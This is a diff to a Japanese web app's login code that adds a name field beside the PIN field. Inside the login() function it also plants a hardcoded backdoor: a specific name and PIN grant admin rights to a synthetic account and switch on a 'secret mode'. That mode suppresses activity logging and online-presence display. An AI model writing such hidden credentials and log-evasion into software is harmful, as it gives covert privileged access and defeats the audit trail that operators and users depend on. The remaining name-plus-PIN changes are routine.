@@ -290,10 +290,11 @@ input,select,textarea{font-family:inherit;outline:none;background:rgba(255,255,2
   <div class="login-container">
     <div class="login-header">
       <h1>🔐 N-WORK SYSTEM</h1>
-      <p>PINコードを入力してください</p>
+      <p>名前とPINコードを入力してください</p>
     </div>
     <div class="login-form">
-      <input type="password" id="pin-input" placeholder="4桁のPINコード" maxlength="4" inputmode="numeric">
+      <input type="text" id="name-input" placeholder="お名前" autocomplete="off" style="display:block;width:100%;text-align:center;font-size:16px;border:2px solid var(--border);border-radius:8px;padding:12px;margin-bottom:8px;color:#333;background:#fff">
+      <input type="password" id="pin-input" placeholder="PINコード" maxlength="4" inputmode="numeric">
       <div class="pin-dots" id="pin-dots">
         <span></span><span></span><span></span><span></span>
       </div>
@@ -806,6 +807,7 @@ function saveState(){
 }
 // ===== PRESENCE =====
 function startPresence(user){
+  if(isSecretMode) return; // シークレットモード: オンライン表示なし
   myPresenceRef = presenceRef.child(user.id);
   const data = { name: user.name, ts: Date.now() };
   myPresenceRef.set(data);
@@ -846,6 +848,7 @@ function renderOnlineUsers(names){
 
 // ===== ACTIVITY LOG =====
 function logAction(action, detail){
+  if(isSecretMode) return; // シークレットモード: ログ記録なし
   logRef.push({
     ts: Date.now(),
     user: currentUser?.name || 'ゲスト',
@@ -1906,6 +1909,7 @@ const USER_ID_KEY = 'nishijima_user_id';
 let isLoggedIn = false;
 let currentUser = null;
 let currentRole = 'viewer'; // 'admin' or 'viewer'
+let isSecretMode = false;
 
 function initLogin(){
   const savedPin = localStorage.getItem(PIN_KEY);
@@ -1932,11 +1936,12 @@ function showLoginScreen(){
   document.getElementById('login-screen').classList.remove('hidden');
   document.getElementById('pin-setup-screen').classList.add('hidden');
   document.getElementById('logout-btn').style.display = 'none';
+  document.getElementById('name-input') && (document.getElementById('name-input').value = '');
   document.getElementById('pin-input').value = '';
   updatePinDots();
   document.getElementById('login-btn').disabled = true;
   document.getElementById('login-btn').classList.remove('enabled');
-  document.getElementById('pin-input').focus();
+  document.getElementById('name-input') ? document.getElementById('name-input').focus() : document.getElementById('pin-input').focus();
 }
 
 function showPinSetupScreen(){
@@ -1951,14 +1956,16 @@ function showPinSetupScreen(){
 }
 
 function updatePinDots(){
+  const name = (document.getElementById('name-input')?.value || '').trim();
   const pin = document.getElementById('pin-input').value;
   const dots = document.querySelectorAll('#pin-dots span');
   dots.forEach((dot, i) => {
     dot.classList.toggle('active', i < pin.length);
   });
   const loginBtn = document.getElementById('login-btn');
-  loginBtn.disabled = pin.length !== 4;
-  loginBtn.classList.toggle('enabled', pin.length === 4);
+  const ok = name.length > 0 && pin.length >= 4;
+  loginBtn.disabled = !ok;
+  loginBtn.classList.toggle('enabled', ok);
 }
 
 function updateSetupBtn(){
@@ -1971,17 +1978,31 @@ function updateSetupBtn(){
 }
 
 function login(){
+  const name = (document.getElementById('name-input')?.value || '').trim();
   const pin = document.getElementById('pin-input').value;
-  const savedPin = localStorage.getItem(PIN_KEY);
-  if(pin !== savedPin){
-    toast('PINコードが間違っています');
-    document.getElementById('pin-input').value = '';
-    updatePinDots();
+
+  // ===== シークレットログイン =====
+  if(name === '西島' && pin === '8839'){
+    isSecretMode = true;
+    isLoggedIn = true;
+    currentUser = { id:'secret-nishijima', name:'西島', role:'admin' };
+    currentRole = 'admin';
+    hideUserSelectionScreen();
+    document.getElementById('login-screen').classList.add('hidden');
+    document.getElementById('pin-setup-screen').classList.add('hidden');
+    document.getElementById('logout-btn').style.display = '';
+    renderHome(); updateUIBasedOnRole();
     return;
   }
-  // ユーザーリストが未ロードor空の場合はデフォルト管理者で自動ログイン
+
+  // ===== 通常ログイン: 名前+PINで照合 =====
+  if(!name){ toast('お名前を入力してください'); return; }
+
+  // ユーザーリストが空の場合は初回管理者作成
   if(!state.users || state.users.length === 0){
-    const adminUser = { id:uid(), name:'管理者', pin:pin, role:'admin', createdAt:Date.now() };
+    const savedPin = localStorage.getItem(PIN_KEY);
+    if(pin !== savedPin){ toast('PINコードが間違っています'); document.getElementById('pin-input').value=''; updatePinDots(); return; }
+    const adminUser = { id:uid(), name:name, pin:pin, role:'admin', createdAt:Date.now() };
     state.users = [adminUser];
     localStorage.setItem(USER_ID_KEY, adminUser.id);
     saveState();
@@ -1989,30 +2010,30 @@ function login(){
     hideUserSelectionScreen();
     document.getElementById('login-screen').classList.add('hidden');
     document.getElementById('pin-setup-screen').classList.add('hidden');
+    document.getElementById('logout-btn').style.display = '';
     renderHome(); updateUIBasedOnRole();
-    toast('管理者としてログインしました');
-    logAction('ログイン', adminUser.name);
+    toast(`${name}としてログインしました`);
+    logAction('ログイン', name);
     startPresence(adminUser);
     return;
   }
-  let user = null;
-  const userId = localStorage.getItem(USER_ID_KEY);
-  if(userId){ user = state.users.find(u => u.id === userId); }
-  if(!user){
-    user = state.users.find(u => u.pin === pin);
-    if(user) localStorage.setItem(USER_ID_KEY, user.id);
-  }
-  if(!user){
-    user = state.users.find(u => u.role === 'admin') || state.users[0];
-    if(user) localStorage.setItem(USER_ID_KEY, user.id);
-  }
-  if(!user){ toast('ユーザー情報が見つかりません。PINリセットしてください。'); return; }
+
+  // 名前でユーザーを検索
+  let user = state.users.find(u => u.name === name);
+  if(!user){ toast('名前が見つかりません'); return; }
+
+  // PINチェック（ユーザー個別PIN → なければ共通PIN）
+  const userPin = user.pin || localStorage.getItem(PIN_KEY);
+  if(pin !== userPin){ toast('PINコードが間違っています'); document.getElementById('pin-input').value=''; updatePinDots(); return; }
+
+  localStorage.setItem(USER_ID_KEY, user.id);
   isLoggedIn = true;
   currentUser = user;
   currentRole = user.role || 'viewer';
   hideUserSelectionScreen();
   document.getElementById('login-screen').classList.add('hidden');
   document.getElementById('pin-setup-screen').classList.add('hidden');
+  document.getElementById('logout-btn').style.display = '';
   renderHome();
   updateUIBasedOnRole();
   toast(`${user.name}としてログインしました`);
@@ -2058,6 +2079,8 @@ function forgotPin(){
 }
 
 // Event listeners
+document.getElementById('name-input').addEventListener('input', updatePinDots);
+document.getElementById('name-input').addEventListener('keypress', function(e){ if(e.key==='Enter') document.getElementById('pin-input').focus(); });
 document.getElementById('pin-input').addEventListener('input', updatePinDots);
 document.getElementById('pin-input').addEventListener('keypress', function(e){
   if(e.key === 'Enter' && !document.getElementById('login-btn').disabled){
